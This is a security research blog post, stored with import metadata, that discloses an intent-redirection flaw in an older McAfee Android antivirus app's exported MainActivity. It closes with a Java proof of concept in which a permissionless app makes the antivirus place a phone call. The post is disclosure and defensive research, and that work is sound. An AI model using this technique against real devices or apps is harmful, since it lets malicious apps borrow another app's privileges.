---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-03-29_attacking-android-antivirus-applications.md
original_filename: 2023-03-29_attacking-android-antivirus-applications.md
title: Attacking Android Antivirus Applications
category: documents
detected_topics:
- mobile-security
- sso
- command-injection
- otp
- api-security
tags:
- imported
- documents
- mobile-security
- sso
- command-injection
- otp
- api-security
language: en
raw_sha256: f930feed8808dcb337bf130e6d9f4d0789bf6caceacf5f85faa20975aa43e917
text_sha256: fd54261dcfcdd870ecc314b82f7ba990a41fb9550e362f66782c415fb4700254
ingested_at: '2026-06-28T07:32:19Z'
sensitivity: unknown
redactions_applied: false
---

# Attacking Android Antivirus Applications

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-03-29_attacking-android-antivirus-applications.md
- Source Type: markdown
- Detected Topics: mobile-security, sso, command-injection, otp, api-security
- Ingested At: 2026-06-28T07:32:19Z
- Redactions Applied: False
- Raw SHA256: `f930feed8808dcb337bf130e6d9f4d0789bf6caceacf5f85faa20975aa43e917`
- Text SHA256: `fd54261dcfcdd870ecc314b82f7ba990a41fb9550e362f66782c415fb4700254`


## Content

---
title: "Attacking Android Antivirus Applications"
page_title: "Attacking Android Antivirus Applications – SCRT Team Blog"
url: "https://blog.scrt.ch/2023/03/29/attacking-android-antivirus-applications/"
final_url: "https://blog.scrt.ch/2023/03/29/attacking-android-antivirus-applications/"
authors: ["2Dai (@mabenz68)"]
programs: ["McAfee"]
bugs: ["Android", "Improper Export of Android Application Components"]
publication_date: "2023-03-29"
added_date: "2023-03-31"
source: "pentester.land/writeups.json"
original_index: 1329
---

# Attacking Android Antivirus Applications

Although the usefulness of security tools such as Antivirus, VPN and EDR is now indisputable in business circles, these solutions often need a lot of privileges and permissions to work properly, also making them an excellent target for an attacker. The presence of a bug in one of these types of solutions could allow a malware to elevate its privileges and cause more damage to the organization.

## Introduction

Recent research at SCRT has been greatly motivated by the paradoxical idea of attacking security solutions. Could these solutions that are supposed to protect the system and block attackers be abused by an attacker to gain even more privileges on the system ?

While doing some research on the subject, I discovered the awesome work already initiated by several security researchers in 2020. We can cite for example the blog posts from [CyberAks Lab](https://www.cyberark.com/resources/threat-research-blog/anti-virus-vulnerabilities-who-s-guarding-the-watch-tower) on common security bugs in Desktop Antivirus products or also the [Orange Tsai](https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html) research on SSL VPN providers. Among the various articles, I did not find any mention about mobile antivirus applications. Are they more secure ? Or does no one care about them ?

## Mobile threat

Over the last decade, smartphone usage has grown exponentially whether for personal or professional use. Due to this increasing need for mobility and ease of use, we are seeing more and more applications and activities related to work on an employee’s personal devices (Mail,VPN,Contacts,Documents..).  
Malicious actors have understood this and we are also seeing an increased volume of malware distribution on mobile platforms compared to previous years.

Security companies have also taken the turn and have started to develop mobile anti-malware protection solutions which surprisingly seem to be used quite a lot.

Here are some of the most downloaded Antivirus Mobile apps on Android:

  * Avast Antivirus & Security (100M+ Downloads)
  * AVG AntiVirus & Security (100M+ Downloads)
  * Mobile Antivirus: Norton 360 (50M+ Downloads)
  * McAfee Security: Antivirus VPN (50M+ Downloads)
  * Kaspersky Security & VPN (50M+ Downloads)

## Android Application Security Model

The Android operating system (OS) is based on a modified version of the Linux Kernel. The whole system is designed with a defense in depth approach from the lowest layers with hardware-assisted encryption and key handling to the highest application security layers with Sandboxing or Storage Access.

This section will mainly focus on the OS and application security measures, further information about other security features can be found directly in the [Android Security Paper](https://source.android.com/static/docs/security/overview/reports/).

All Android applications are executed in an application sandbox. The OS takes advantage of the SELinux protection to maintain isolation between the application resources (_Data and Code execution_). Each application runs in its own process and is assigned with a unique user ID (UID). The applications are therefore not allowed to access other apps files and resources as on Linux each user is isolated from each other.

  * Storage:

  
  
  ls -la /data/data/
  ...
  drwx------  8 u0_a118  u0_a118  4.0K 2022-10-17 17:18 com.google.android.youtube
  drwx------  12 u0_a183  u0_a183  4.0K 2023-02-22 17:22 com.wsandroid.suite
  drwx------  9 u0_a132  u0_a132  4.0K 2022-12-27 14:06 com.google.android.videos
  ...

  * Execution:

  
  
  $ ps -ef
  ...
  u0_a146  20160  292 0 15:44 ?  00:00:00 com.google.android.permissioncontroller
  u0_a107  20890  292 0 16:31 ?  00:00:00 com.android.vending:background
  u0_a183  21323  292 6 20:46 ?  00:00:24 com.wsandroid.suite
  u0_a126  17387  292 0 36:11 ?  00:00:01 com.google.android.calendar
  ...

[![Fig.1 Android Application Sandbox](/wp-content/uploads/2023/02/2023-02-24-Screenshot.png)](/wp-content/uploads/2023/02/2023-02-24-Screenshot.png)****Fig.1 Android Application Sandbox****

On Android, every access is denied by default (_Access to external storage, Telephony Stack.._). When an application needs a special access, it must ask for the permission. We can distinguish 2 types of permissions: **Linux Permissions** and other **Android Framework Permissions**.

  * Linux permissions are defined and managed by the Linux kernel through Group IDs. For example, when an application uses the camera; an `android.permission.CAMERA` permission is requested to the OS. The OS grants the permission by adding the application UID into the correct Linux group. Linux permissions and associated GIDs can be found in the [platform.xml file](https://android.googlesource.com/platform/frameworks/base/+/master/data/etc/platform.xml) . These permissions are defined and fixed when the application is installed.

However, if we look at the **permission documentation** we can see a lot of other permissions that are not present and mapped to a special GID.

  * Other Android permissions are directly checked at the runtime during Inter Process Communication events (IPC) by the requested services with Android API primitives like `checkCallingPermission` or `enforceCallingPermission`.

The Inter Process Communication mechanisms are used to allow the apps to offer some services or features to other processes/applications. Each app should explicitly define what features they want to expose to other apps. In general, developers tend to use high-level IPC abstractions such as Intents, Content Providers, Messengers..

Finally, from an attacker point of view, all of these IPC mechanisms are interesting targets as they offer the possibility to interact with higher privileged processes/applications.

Most of this information about Application Components, Permissions and exported features are defined in the `AndroidManifest.xml` file of each application. This file describes all essential information about an android application.

## ‘McAfee Security: Antivirus VPN’ Android Application

Knowing about Android’s security model, I quickly wondered what these antivirus apps really do and if they do it correctly. This research started in June 2021. At the same period, some of my colleagues at SCRT were already doing security research on other McAfee products. This partly guided my choice and defined my first target: The ‘McAfee Security: Antivirus VPN – 5.12.0.131’ application which was the lastest release at the time.

Looking at the McAfee `AndroidManifest.xml` it is possible to quickly get an overview of the current attack surface and app privileges (though the requested permissions).

### App Privileges

By analyzing the permissions, we quickly realize that the application requires a lot of permissions on the system, which makes it an even more interesting target for a malicious application. In total more than 70+ different permissions were defined including permissions deemed as dangerous.
  
  
  <uses-permission android:name="android.permission.MODIFY_PHONE_STATE"/>
  <uses-permission android:name="android.permission.READ_LOGS"/>
  <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
  <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
  <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
  <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
  <uses-permission android:name="android.permission.READ_CONTACTS"/>
  <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
  <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
  <uses-permission android:name="android.permission.INTERNET"/>
  <uses-permission android:name="android.permission.VIBRATE"/>
  <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
  <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
  <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
  <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
  <uses-permission android:name="android.permission.WRITE_SYNC_SETTINGS"/>
  <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
  <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
  ...
  <uses-permission android:name="android.permission.GET_TASKS"/>
  <uses-permission android:name="android.permission.REAL_GET_TASKS"/>
  <uses-permission android:name="android.permission.CALL_PHONE"/>

### Main Activity Vulnerability

To get an overview of the attack surface, it is interesting to look at all components that allow IPC with other applications without any special permission (or with a misconfigured permission).

By default, any external application installed on the system can directly interact with a component of another app if this component:

  * is defined with the attribute `exported=true`
  * is defined with an `intent-filter` in the component.

> Actually, prior to Android 12, all components (activities, services, and broadcast receivers) with a declared intent-filter were automatically exported by default. In Android >= 12, all components must explicitly be declared with the _android:exported_ attribute.

The `AndroidManifest.xml` of the Mcafee application reveals that several components can be called by external apps.

As an example the `com.mcafee.activity.MainActivity` component is exported:
  
  
  <activity android:theme="@style/MTheme.Light.NoTitleBar.NoPreview" android:label="@string/app_short_name" android:name="com.mcafee.activity.MainActivity" android:excludeFromRecents="true" android:launchMode="singleTask" android:configChanges="keyboard|keyboardHidden|navigation|orientation|screenLayout|screenSize" android:windowSoftInputMode="adjustUnspecified|stateUnchanged|stateHidden|stateAlwaysHidden|adjustPan" android:hardwareAccelerated="true">
  <intent-filter>
  <action android:name="mcafee.intent.action.mainscreen"/>
  <category android:name="android.intent.category.DEFAULT"/>
  </intent-filter>
  <intent-filter android:autoVerify="true">
  <action android:name="android.intent.action.VIEW"/>
  <category android:name="android.intent.category.DEFAULT"/>
  <category android:name="android.intent.category.BROWSABLE"/>
  <data android:scheme="https" android:host="home.mcafee.com" android:pathPattern="/mobile/campaign.aspx"/>
  <data android:scheme="https" android:host="home.mcafee.com" android:pathPattern="/root/campaign.aspx"/>
  </intent-filter>
  </activity>

This component is an activity which is started following the standard [activity lifecycle](https://developer.android.com/guide/components/activities/activity-lifecycle). As a result, one of the first methods which is called is _onCreate()_.
  
  
  public void onCreate(Bundle bundle) {
  ViewStub viewStub;
  super.onCreate(bundle);
  u();
  AppsFlyerLib.getInstance().registerConversionListener(getApplicationContext(), this.w);
  ...
  viewStub.inflate();
  new ActivityStackDelegate(this).finishActivities(new ActivitySelectors.Others(this));
  C();
  }

This _onCreate()_ method in turn calls the method _u()_.
  
  
  private void u() {
  **** Intent intent = getIntent();
  String stringExtra = intent.getStringExtra(TRIGGER);
  if (stringExtra != null && stringExtra.equalsIgnoreCase("MESSAGING")) {
  Intent intent2 = null;
  String str = "";
  if (intent.hasExtra("ACTION")) {
  ...
  } else if (intent.hasExtra("SCREEN")) {
  StringTokenizer stringTokenizer = new StringTokenizer(intent.getStringExtra("SCREEN"), MoEConstants.EVENT_SEPARATOR);
  ArrayList arrayList = new ArrayList();
  String str2 = str;
  int i = 0;
  while (stringTokenizer.hasMoreElements()) {
  if (i == 0) {
  str2 = (String) stringTokenizer.nextElement();
  } else {
  arrayList.add((String) stringTokenizer.nextElement());
  }
  i++;
  }
  try {
  intent2 = new Intent(this, Class.forName(str2));
  } catch (Exception unused) {
  }
  if (arrayList.size() > 0) {
  Iterator it = arrayList.iterator();
  while (it.hasNext()) {
  String[] split = ((String) it.next()).split("=");
  if (intent2 != null) {
  intent2.putExtra(split[0], split[1]);
  }
  }
  }
  }
  if (intent2 != null) {
  Bundle extras = intent.getExtras();
  if (extras != null) {
  intent2.putExtras(extras);
  }
  ...
  startActivity(intent2);
  }
  }
  }

  1. The _u()_ method retrieves the current intent with its parameters (extras).
  2. The first extra must be set to `'TRIGGER:MESSAGING'` to trigger the vulnerable code.
  3. A StrinkTokenizer is retrieved and reflected in `intent2`. According to the code, the stringTokenizer is formatted with the `'SCREEN'` extra like this : `ClassName;extra1_key=value;extra2_key=value`.
  4. Finally, the application starts the crafted activity with `startActivity(intent2);`.

Using this code, it is possible to start arbitrary components with arbitrary extras within the context of the McAfee application.

## Exploit payload:

Here is a simple code example of a malicious application (installed without any permissions) that leverages the `McAfee Security: Antivirus VPN` application vulnerability discovered to use the “**android.permission.CALL_PHONE** ” permission and call a random number.
  
  
  final String MA_APP = "com.wsandroid.suite";
  // Internal component  
  final String payload = "com.mcafee.activitystack.ActivityLauncherActivity";
  
  Intent intent3 = new Intent("android.intent.action.CALL");
  intent3.setData(Uri.parse("tel:042-424-242-4"));
  
  Intent intent = new Intent();
  // Vulnerable Activity
  intent.setClassName(MA_APP,"com.mcafee.activity.MainActivity");
  intent.putExtra("TRIGGER","MESSAGING");
  intent.putExtra("SCREEN", payload);
  // Using a similiar issue in another internal component to directly pass packed intents;
  intent.putExtra("ala:pack_intent",intent3);  
  startActivity(intent);

****Fig.2 Simple proof of concept of the vulnerability****

Since the activity is started from the context of the McAfee application, this issue can be leveraged to access Content Providers and all kinds of non-exported components with all the permissions defined by the target.

Again, it’s quite surprising for a security product to introduce such bad practices (using so many permissions) and to have a vulnerability of the sort directly in the `Main` Activity. It shows a certain negligence that really calls into question the usefulness of having certain antivirus applications on mobile phones. However, research done on other McAfee products showed similar results and will warrant another blog post altogether.

## Timeline:

  * The issue was reported the 15th of December 2021 to the McAfee Security team.
  * The McAfee Mobile Security 5.x application was EOLed and updated to a new and redesigned mobile v6.x app.

Posted on [March 29, 2023March 29, 2023](/2023/03/29/attacking-android-antivirus-applications/)Author [2Dai](/author/dib/)Categories [Exploit](/category/exploit/), [News](/category/news/)
